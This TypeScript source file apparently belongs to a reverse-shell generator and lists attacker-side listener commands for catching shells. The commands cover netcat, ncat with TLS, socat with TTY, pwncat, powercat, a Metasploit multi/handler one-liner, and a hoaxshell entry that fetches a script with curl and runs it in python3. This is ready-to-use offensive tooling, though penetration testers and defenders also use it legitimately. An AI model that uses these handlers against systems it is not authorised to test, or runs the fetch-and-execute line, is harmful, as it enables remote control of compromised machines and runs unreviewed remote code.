export type IListenerType = {
  label: string
  value: string
}

export type IListenerCommand = {
  [value: string]: string
}

export const LISTENER_TYPES = [
  { label: 'Bash', value: 'bash' },
  { label: 'Netcat', value: 'nc' },
  { label: 'Netcat FreeBSD', value: 'nc freebsd' },
  { label: 'Busybox Netcat', value: 'busybox nc' },
  { label: 'NCat', value: 'ncat' },
  { label: 'NCat.exe', value: 'ncat.exe' },
  { label: 'NCat (TLS)', value: 'ncat (TLS)' },
  { label: 'RLWRAP + Netcat', value: 'rlwrap + nc' },
  { label: 'Rustcat', value: 'rustcat' },
  { label: 'PWNCat', value: 'pwncat' },
  { label: 'Windows ConPty', value: 'windows ConPty' },
  { label: 'Socat', value: 'socat' },
  { label: 'Socat (TTY)', value: 'socat (TTY)' },
  { label: 'Powercat', value: 'powercat' },
  { label: 'MSFConsole', value: 'msfconsole' },
  { label: 'Hoaxshell', value: 'hoaxshell' }
]

export const LISTENER_COMMANDS = [
  { nc: 'nc -lvnp {port}' },
  { 'nc freebsd': 'nc -lvn {port}' },
  { 'busybox nc': 'busybox nc -lp {port}' },
  { ncat: 'ncat -lvnp {port}' },
  { 'ncat.exe': 'ncat.exe -lvnp {port}' },
  { 'ncat (TLS)': 'ncat --ssl -lvnp {port}' },
  { 'rlwrap + nc': 'rlwrap -cAr nc -lvnp {port}' },
  { rustcat: 'rcat listen {port}' },
  { pwncat: 'python3 -m pwncat -lp {port}' },
  { 'windows ConPty': 'stty raw -echo; (stty size; cat) | nc -lvnp {port}' },
  { socat: 'socat -d -d TCP-LISTEN:{port} STDOUT' },
  { 'socat (TTY)': 'socat -d -d file:`tty`:raw:echo=0 TCP-LISTEN:{port}' },
  { powercat: 'powercat -l -p {port}' },
  {
    msfconsole:
      'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'
  },
  {
    hoaxshell:
      'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'
  }
]
